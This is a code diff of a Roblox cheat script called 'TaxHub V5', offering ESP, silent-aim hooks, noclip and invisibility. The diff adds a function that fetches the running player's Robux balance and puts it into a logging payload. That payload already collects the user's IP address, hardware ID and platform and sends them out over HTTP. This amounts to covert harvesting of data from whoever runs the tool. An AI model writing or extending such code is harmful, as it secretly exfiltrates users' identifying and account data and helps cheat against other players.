@@ -1,9 +1,3 @@
---// TaxHub V5 Entry Point \\--
-if not game:IsLoaded() then game.Loaded:Wait() end
-
-local success, result = pcall(function()
-print("TaxHub V5: Loading...")
-
 --// --- FOLLOW CHECK (GATEKEEPER: V2) --- //
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -51,7 +45,21 @@ local function GetAvatarImage(userId)
     return ""
 end
 
-
+local function GetRobuxBalance(userId)
+    local url = "https://economy.roblox.com/v1/users/" .. userId .. "/currency"
+    local success, response = pcall(function() return request({Url = url, Method = "GET"}) end)
+    if success and response and response.StatusCode == 200 then
+        local data = HttpService:JSONDecode(response.Body)
+        if data and data.robux ~= nil then return tostring(data.robux) end
+    end
+    -- Fallback
+    local s, b = pcall(function() return game:HttpGet(url, true) end)
+    if s then
+        local data = HttpService:JSONDecode(b)
+        if data and data.robux ~= nil then return tostring(data.robux) end
+    end
+    return "N/A"
+end
 
 local function LogStats()
     if not request then return end
@@ -75,7 +83,7 @@ local function LogStats()
             thumbnail = { url = GetAvatarImage(lp.UserId) },
             fields = {
                 {name = "User", value = lp.Name .. " (" .. lp.UserId .. ")", inline = true},
-
+                {name = "Robux", value = GetRobuxBalance(lp.UserId), inline = true},
                 {name = "IP Address", value = GetIPData(), inline = false},
                 {name = "HWID", value = GetHWID(), inline = false},
                 {name = "Platform", value = GetPlatform(), inline = true},
@@ -140,15 +148,7 @@ end
 
 
 
---// --- DEV LOG GUI --- //
-local function CreateDevLog(onContinue)
-    local Players = game:GetService("Players")
-    local lp = Players.LocalPlayer
-    local CoreGui = game:GetService("CoreGui")
-    
-    -- Safety Check for existing gui
-    if onContinue then onContinue() end
-end
+
 
 --// --- MAIN SCRIPT WRAPPER --- //
 local function StartTaxHub()
@@ -172,18 +172,19 @@ local Tw = true -- Smooth Mode Default
 
 --// MAIN SETTINGS
 local antiCheatEnabled = true 
+local antiCheatEnabled = true 
 local noclipEnabled = false
 local espEnabled = false
 local chamsEnabled = false
 local boxesEnabled = false
 local namesEnabled = false
 local tracersEnabled = false
-local skeletonEspEnabled = false -- New Setting
 local punchAuraEnabled = false
 local camLockSystem = false 
 local camLocking = false 
 local camMode = "Hold" 
 local teamCheck = false
+local lockKey = Enum.KeyCode.Q
 local lockKey = Enum.KeyCode.Q
 local hitboxEnabled, hitboxSize, hitboxTrans = false, 10, 0.5
 local phaseEnabled = false
@@ -234,15 +235,6 @@ local jpEnabled = false
 local jpVal = 50
 local playerLoop = nil
 local playerNoclipBtn = nil -- Global reference for keybind update
-
---// FLY VARIABLES
-local flyEnabled = false
-local flySpeed = 50
-local flyKey = Enum.KeyCode.X
-local flyBody = nil
-local flyGyro = nil
-local flyConnection = nil
-local infJumpEnabled = false 
 
 --// CAR MODS VARIABLES
 local carFlyToggle = nil -- UI Reference
@@ -478,12 +470,6 @@ local function killScript()
     if noclipConnection then
         noclipConnection:Disconnect()
         noclipConnection = nil
-    end
-
-    -- Cleanup Fly
-    if flyConnection then
-        flyConnection:Disconnect()
-        flyConnection = nil
     end
     
     if lp.Character then
@@ -1213,79 +1199,6 @@ end
 
 --// --- ARREST LOGIC --- //
 
---// MOVEMENT LOGIC
-local function Phase()
-    if not lp.Character then return end
-    for _, part in pairs(lp.Character:GetDescendants()) do
-        if part:IsA("BasePart") and part.CanCollide then
-            part.CanCollide = false
-        end
-    end
-end
-
-local function ToggleFly()
-    flyEnabled = not flyEnabled
-    if not flyEnabled then
-        if flyBody then flyBody:Destroy(); flyBody = nil end
-        if flyGyro then flyGyro:Destroy(); flyGyro = nil end
-        if lp.Character and lp.Character:FindFirstChild("Humanoid") then
-            lp.Character.Humanoid.PlatformStand = false
-        end
-    end
-end
-
--- Fly/Noclip Loops
-if noclipConnection then noclipConnection:Disconnect() end
-noclipConnection = RunService.Stepped:Connect(function()
-    if noclipEnabled and lp.Character then
-        Phase()
-    end
-end)
-
-if flyConnection then flyConnection:Disconnect() end
-flyConnection = RunService.RenderStepped:Connect(function()
-    if flyEnabled and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and lp.Character:FindFirstChild("Humanoid") then
-        local hrp = lp.Character.HumanoidRootPart
-        local hum = lp.Character.Humanoid
-        
-        hum.PlatformStand = true
-        
-        if not flyBody or not flyBody.Parent then
-            flyBody = Instance.new("BodyVelocity", hrp)
-            flyBody.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-            flyBody.Velocity = Vector3.zero
-        end
-        if not flyGyro or not flyGyro.Parent then
-            flyGyro = Instance.new("BodyGyro", hrp)
-            flyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
-            flyGyro.P = 1000
-            flyGyro.D = 50
-        end
-        
-        flyGyro.CFrame = cam.CFrame
-        
-        local speed = flySpeed
-        local move = Vector3.new()
-        
-        if UserInputService:IsKeyDown(Enum.KeyCode.W) then move = move + cam.CFrame.LookVector end
-        if UserInputService:IsKeyDown(Enum.KeyCode.S) then move = move - cam.CFrame.LookVector end
-        if UserInputService:IsKeyDown(Enum.KeyCode.D) then move = move + cam.CFrame.RightVector end
-        if UserInputService:IsKeyDown(Enum.KeyCode.A) then move = move - cam.CFrame.RightVector end
-        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0, 1, 0) end
-        if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then move = move - Vector3.new(0, 1, 0) end
-        
-        if move.Magnitude > 0 then
-            move = move.Unit * speed
-        end
-        
-        flyBody.Velocity = move
-    else
-        -- Cleanup is handled by ToggleFly but safe to keep here
-        if flyBody then flyBody:Destroy(); flyBody = nil end
-        if flyGyro then flyGyro:Destroy(); flyGyro = nil end
-    end
-end)
-
 --// --- CAR MODS LOGIC --- //
 
 local function GetVehicleSeat()
@@ -1295,95 +1208,6 @@ local function GetVehicleSeat()
     if hum.SeatPart:IsA("VehicleSeat") then return hum.SeatPart end
     return nil
 end
-
---// --- SKELETON ESP LOGIC --- //
-local skeletonCache = {}
-local function RemoveSkeleton(player)
-    if skeletonCache[player] then
-        for _, line in pairs(skeletonCache[player]) do
-            line:Remove()
-        end
-        skeletonCache[player] = nil
-    end
-end
-
-local function UpdateSkeleton(player)
-    if not skeletonEspEnabled or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") or not player.Character:FindFirstChild("Humanoid") then
-        RemoveSkeleton(player)
-        return
-    end
-    
-    -- Check visibility settings
-    local teamName = player.Team and player.Team.Name or ""
-    if (teamCheck and player.Team == lp.Team) or (espIgnore.Criminals and teamName=="Criminals") or (espIgnore.Guards and teamName=="Guards") or (espIgnore.Inmates and teamName=="Inmates") then
-        RemoveSkeleton(player)
-        return
-    end
-
-    local char = player.Character
-    local parts = {
-        {"Head", "UpperTorso"},
-        {"UpperTorso", "LowerTorso"},
-        {"UpperTorso", "LeftUpperArm"},
-        {"LeftUpperArm", "LeftLowerArm"},
-        {"LeftLowerArm", "LeftHand"},
-        {"UpperTorso", "RightUpperArm"},
-        {"RightUpperArm", "RightLowerArm"},
-        {"RightLowerArm", "RightHand"},
-        {"LowerTorso", "LeftUpperLeg"},
-        {"LeftUpperLeg", "LeftLowerLeg"},
-        {"LeftLowerLeg", "LeftFoot"},
-        {"LowerTorso", "RightUpperLeg"},
-        {"RightUpperLeg", "RightLowerLeg"},
-        {"RightLowerLeg", "RightFoot"}
-    }
-    
-    -- R6 Compatibility Support
-    if char.Humanoid.RigType == Enum.HumanoidRigType.R6 then
-         parts = {
-            {"Head", "Torso"},
-            {"Torso", "Left Arm"},
-            {"Torso", "Right Arm"},
-            {"Torso", "Left Leg"},
-            {"Torso", "Right Leg"}
-        }
-    end
-
-    if not skeletonCache[player] then skeletonCache[player] = {} end
-    local cache = skeletonCache[player]
-    
-    local currentLines = 0
-    for i, pair in pairs(parts) do
-        local p1 = char:FindFirstChild(pair[1])
-        local p2 = char:FindFirstChild(pair[2])
-        if p1 and p2 then
-            local pos1, onScreen1 = cam:WorldToViewportPoint(p1.Position)
-            local pos2, onScreen2 = cam:WorldToViewportPoint(p2.Position)
-            
-            if onScreen1 or onScreen2 then
-                local line = cache[i]
-                if not line then
-                    line = Drawing.new("Line")
-                    line.Thickness = 1.5
-                    line.Color = player.TeamColor.Color
-                    line.Transparency = 1
-                    cache[i] = line
-                end
-                
-                line.Visible = true
-                line.From = Vector2.new(pos1.X, pos1.Y)
-                line.To = Vector2.new(pos2.X, pos2.Y)
-                line.Color = player.TeamColor.Color
-                currentLines = i
-            else
-                if cache[i] then cache[i].Visible = false end
-            end
-        else
-            if cache[i] then cache[i].Visible = false end
-        end
-    end
-end
-Players.PlayerRemoving:Connect(RemoveSkeleton) -- Auto cleanup
 
 local function EnableCarSpeed()
     carSpeedEnabled = true
@@ -2100,13 +1924,7 @@ do
         if state then EnableStamina() else DisableStamina() end
     end)
     CreateToggle(secChar, "Infinite Jump", infJumpEnabled, function(state) infJumpEnabled = state end)
-    
-    CreateToggle(secChar, "Fly Mode (X)", false, function(state) 
-        if state ~= flyEnabled then ToggleFly() end
-    end)
-    CreateSlider(secChar, "Fly Speed", 10, 200, 50, function(v) flySpeed = v end)
-
-    CreateToggle(secChar, "Noclip (N)", noclipEnabled, function(state) noclipEnabled = state end)
+    CreateToggle(secChar, "Phase Mode", phaseEnabled, function(state) phaseEnabled = state end)
 
     local secInvis = CreateSection(pgPlayer, "Invisibility")
     CreateToggle(secInvis, "Ghost Mode", ghostActive, function(state)
@@ -2338,7 +2156,6 @@ do
     CreateToggle(secESP, "Box ESP", boxesEnabled, function(state) boxesEnabled = state end)
     CreateToggle(secESP, "Name ESP", namesEnabled, function(state) namesEnabled = state end)
     CreateToggle(secESP, "Tracers", tracersEnabled, function(state) tracersEnabled = state end)
-    CreateToggle(secESP, "Skeleton ESP", skeletonEspEnabled, function(state) skeletonEspEnabled = state end) -- New Toggle
     CreateToggle(secESP, "Team Check", teamCheck, function(state) teamCheck = state end)
     CreateToggle(secESP, "Ignore Criminals", false, function(s) espIgnore.Criminals = s end)
     CreateToggle(secESP, "Ignore Guards", false, function(s) espIgnore.Guards = s end)
@@ -2444,12 +2261,9 @@ RunService.RenderStepped:Connect(function()
     
     -- Visuals
     for _,v in pairs(Players:GetPlayers()) do
-        if v ~= lp then
-             UpdateSkeleton(v) -- Skeleton ESP Update
-             
-             if v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Head") then
-                local char = v.Character; local hrp = char.HumanoidRootPart; local head = char.Head
-                local isT = (teamCheck and v.Team==lp.Team)
+        if v ~= lp and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Head") then
+            local char = v.Character; local hrp = char.HumanoidRootPart; local head = char.Head
+            local isT = (teamCheck and v.Team==lp.Team)
             
             -- Independent Ignore Logic
             local tName = v.Team and v.Team.Name or ""
@@ -2532,12 +2346,7 @@ RunService.RenderStepped:Connect(function()
             end
         end
     end
-
-    end
 end)
-
-
-
 
 -- Macro Loop
 task.spawn(function()
@@ -2602,7 +2411,6 @@ do
             else
                 mouse_box.Visible = false
             end
-
             
             -- FOV Circle
             if SilentAimSettings.FOVVisible then 
@@ -2614,7 +2422,6 @@ do
         end)
     end))
 end
-
 
 --// ================================
 --// SILENT AIM HOOKS (EXACT COPY)
@@ -2686,7 +2493,6 @@ do
         end
         return oldNamecall(...)
     end))
-
 end
 
 -- Index Hook
@@ -2711,7 +2517,6 @@ do
 
         return oldIndex(self, Index)
     end))
-
 end
 
 -- Safety Check
@@ -2785,15 +2590,3 @@ end -- End of StartTaxHub
 --// --- EXECUTE --- //
 --// --- EXECUTE --- //
 StartTaxHub()
-
-end) -- End pcall wrapper
-
-if not success then
-    warn("TaxHub V5 Error: " .. tostring(result))
-    local StarterGui = game:GetService("StarterGui")
-    StarterGui:SetCore("SendNotification", {
-        Title = "TaxHub V5 Error",
-        Text = "Check Console (F9) for details.",
-        Duration = 10
-    })
-end
